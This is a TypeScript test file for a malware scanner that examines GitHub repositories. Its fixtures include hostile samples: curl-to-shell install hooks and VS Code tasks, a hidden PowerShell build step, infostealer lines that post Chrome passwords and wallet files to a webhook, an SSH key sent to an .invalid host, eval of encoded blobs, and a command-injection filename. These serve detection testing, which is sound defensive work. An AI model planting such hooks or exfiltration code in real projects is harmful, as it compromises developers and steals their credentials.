/**
 * Calibration guard (see PROGRESS.md, session 7). The rules were tuned on 38
 * popular, clean repositories; these tests make sure that tuning never lets a
 * known malware shape through, and that the legitimate patterns which used to
 * raise false alarms stay quiet. Every sample is harmless: .invalid domains,
 * random bytes instead of payloads, nothing that runs.
 */

import { describe, expect, it } from "vitest";

import { GitHubClient } from "../src/engine/github";
import { scanRepo } from "../src/engine/scanner";
import { FakeGitHub, makeTarball } from "./helpers";

const NOW = () => new Date("2026-10-01T00:00:00Z");

async function scanFiles(files: Record<string, string>) {
  const gh = new FakeGitHub();
  gh.tarball = makeTarball(files);
  return scanRepo({ owner: "octo", repo: "demo" }, new GitHubClient({ fetch: gh.fetch }), { now: NOW });
}

/** Deterministic random bytes as a binary string (not a program). */
function noiseBytes(bytes: number): string {
  let x = 12345;
  let out = "";
  for (let i = 0; i < bytes; i++) {
    x = (x * 1103515245 + 12345) % 2 ** 31;
    out += String.fromCharCode((x >>> 16) & 0xff);
  }
  return out;
}

/** Random-looking base64 that decodes to noise. */
const noise = (bytes: number): string => btoa(noiseBytes(bytes));

describe("known malware shapes stay flagged", () => {
  it("fake job interview: install hook plus decoded code run with eval", async () => {
    const r = await scanFiles({
      "package.json": JSON.stringify({ scripts: { prepare: "node server/app.js" } }, null, 2),
      "server/config.js": `const p = "${noise(400)}";\neval(atob(p));\n`,
    });
    expect(r.verdict).toBe("dangerous");
  });

  it("npm install hook that pipes a download into a shell", async () => {
    const r = await scanFiles({
      "package.json": JSON.stringify({ scripts: { postinstall: "curl -s https://example.invalid/i.sh | sh" } }, null, 2),
    });
    expect(r.verdict).toBe("dangerous");
  });

  it("VS Code task that runs a download when the folder is opened", async () => {
    const task = { label: "setup", type: "shell", command: "curl -s https://example.invalid/t | bash", runOptions: { runOn: "folderOpen" } };
    const r = await scanFiles({ ".vscode/tasks.json": JSON.stringify({ version: "2.0.0", tasks: [task] }, null, 2) });
    expect(r.verdict).toBe("dangerous");
  });

  it("Visual Studio build event that starts a hidden PowerShell", async () => {
    const r = await scanFiles({
      "Tool/Tool.vcxproj":
        "<Project>\n  <ItemDefinitionGroup>\n    <PreBuildEvent>\n" +
        '      <Command>powershell -nop -w hidden -c "rundll32 x64\\Debug\\data.db,Start"</Command>\n' +
        "    </PreBuildEvent>\n  </ItemDefinitionGroup>\n</Project>\n",
    });
    expect(r.verdict).toBe("dangerous");
  });

  it("info stealer: browser passwords, DPAPI, wallets and a webhook", async () => {
    const r = await scanFiles({
      "grab.py":
        'db = os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")\n' +
        "key = win32crypt.CryptUnprotectData(blob, None, None, None, 0)\n" +
        'w = os.path.join(appdata, "Exodus", "exodus.wallet")\n' +
        'requests.post("https://discord.com/api/webhooks/123456789/' + "a".repeat(30) + '", data=out)\n',
    });
    expect(r.verdict).toBe("dangerous");
  });

  it("README lure: disable the antivirus, then run a PowerShell one-liner", async () => {
    const r = await scanFiles({
      "README.md":
        "# Free Tool\n\n1. Disable Windows Defender real-time protection.\n" +
        '2. Run: `powershell -c "irm https://example.invalid/x.ps1 | iex"`\n',
    });
    expect(r.verdict).toBe("suspicious");
  });

  it("payload hidden in a test folder and started by an install script", async () => {
    const r = await scanFiles({
      "package.json": JSON.stringify({ scripts: { postinstall: "node tests/setup.js" } }, null, 2),
      "tests/setup.js": `const p = "${noise(400)}";\neval(atob(p));\n`,
    });
    expect(r).toMatchObject({ verdict: "dangerous", testFilesCapped: false });
  });

  it("SSH key read and posted in the same file", async () => {
    const r = await scanFiles({
      "sync.py":
        'key = open(os.path.join(home, ".ssh", "id_rsa")).read()\nrequests.post("https://example.invalid/k", data=key)\n',
    });
    expect(r.ruleScores["GR-CODE-004"]).toBe(25);
  });

  it("setup.py that downloads during install", async () => {
    const r = await scanFiles({
      "setup.py": 'import urllib.request\ncode = urllib.request.urlopen("https://example.invalid/p").read()\nexec(code)\n',
    });
    expect(["suspicious", "dangerous"]).toContain(r.verdict);
  });
});

describe("test files of security tools", () => {
  it("do not change the verdict band on their own when nothing runs by itself", async () => {
    // Attack samples in tests (curl|sh, a bidi filename) plus a lone .exe link in the README.
    const r = await scanFiles({
      "README.md": "# Viewer\n\nGet it: https://example.invalid/viewer.exe\n",
      "tests/views/pane.test.ts": `expect(name("$(curl evil|sh).txt")).toBe(safe);\nconst reversed = "invoice${String.fromCodePoint(0x202e)}txt.exe";\n`,
    });
    expect(r.ruleScores).toMatchObject({ "GR-CODE-002": 35, "GR-OBF-002": 15, "GR-LINK-001": 20 });
    // The non-test findings (the .exe link, 20) are clean-level, so the test-file
    // findings cannot even make it suspicious.
    expect(r).toMatchObject({ verdict: "clean", testFilesCapped: true });
  });

  it("are still held at suspicious when the non-test findings are suspicious-level", async () => {
    const r = await scanFiles({
      "README.md": "# Tool\n\nDownload: https://example.invalid/a.exe and https://anonfiles.invalid/b\n",
      "install.sh": 'curl -fsSL https://evil.invalid/x.sh | sh\n',
      "tests/payload.test.ts": `const reversed = "invoice${String.fromCodePoint(0x202e)}txt.exe";\nexec(atob("..."));\n`,
    });
    expect(r.verdict).toBe("suspicious");
    expect(r.score).toBeLessThan(70);
    expect(r.testFilesCapped).toBe(true);
  });
});

describe("local round-trip and non-executed instruction files are not false positives", () => {
  it("eval of a value the file just encoded from visible source is a weak signal, not decisive", async () => {
    // A dev verification harness base64-encodes a visible local script only to keep
    // paths and quotes out of shell syntax, then decodes and runs it (morluto/rea).
    const r = await scanFiles({
      "scripts/verify-client.mjs":
        "const script = `const fs=require('node:fs');console.log(fs.readFileSync(p,'utf8'));`;\n" +
        'const encodedScript = Buffer.from(script).toString("base64");\n' +
        "run({ command: `node -e \"eval(Buffer.from('${encodedScript}','base64').toString('utf8'))\"` });\n",
    });
    expect(r.ruleScores["GR-CODE-001"]).toBe(5);
    expect(r.verdict).not.toBe("dangerous");
  });

  it("still flags eval of an opaque literal blob held in a variable", async () => {
    const r = await scanFiles({
      "server/config.js": `const p = "${noise(400)}";\neval(atob(p));\n`,
    });
    expect(r.ruleScores["GR-CODE-001"]).toBe(45);
  });

  it("does not count curl | sh shown on an HTML install page or in a changelog", async () => {
    const r = await scanFiles({
      "website/get-started/index.html":
        "<pre><code>curl -fsSL https://example.invalid/install.sh | bash</code></pre>\n",
      "docs/releases/6.5.0.json": '{"body":"fix(install): curl -fsSL https://example.invalid/i.sh | sh guard"}\n',
    });
    expect(r.ruleScores["GR-CODE-002"]).toBeUndefined();
    expect(r.verdict).toBe("clean");
  });
});

describe("legitimate patterns from popular repositories stay clean", () => {
  it("documentation, git hooks, install scripts and test data", async () => {
    const r = await scanFiles({
      "README.md":
        "# Demo\n\n" +
        "Install: `curl -fsSL https://example.invalid/install.sh | sh`\n\n" +
        "* [Website repo](https://github.com/octo/octo.com)\n" +
        "* Example update URL: `https://example.com/app.exe`\n" +
        "* We published a [survey](https://bit.ly/2ZqJijr).\n" +
        "* [File sharing API](https://www.dropbox.com/developers)\n",
      "CHANGELOG.md": "- Signed binaries should reduce antivirus false positives.\n",
      "docs/zip.md": "Create an encrypted archive with a specific password:\n\n`zip -e archive.zip file`\n",
      "package.json": JSON.stringify({ scripts: { prepare: "husky", preinstall: "npx only-allow pnpm" } }, null, 2),
      "tools/install.sh": "#!/bin/sh\n# Usage:\n#   curl -fsSL https://example.invalid/install.sh | sh\necho installing\n",
      "dist/app.js":
        "console.log(1);\n//# sourceMappingURL=data:application/json;base64," +
        btoa(JSON.stringify({ version: 3, mappings: noise(300) })) +
        "\n",
      "test/png.js": `export const ICON = "${btoa("\x89PNG\r\n\x1a\n" + noiseBytes(300))}";\n`,
      "vendor/unicode.min.js": `var r="${String.fromCodePoint(0x202a)}-${String.fromCodePoint(0x202e)}";\n`,
      "plugins/perl.zsh": "alias v='curl -s https://example.invalid/v.html | perl -ne \"print if /v/\"'\n",
    });
    expect(r.findings).toEqual([]);
    expect(r.verdict).toBe("clean");
  });
});
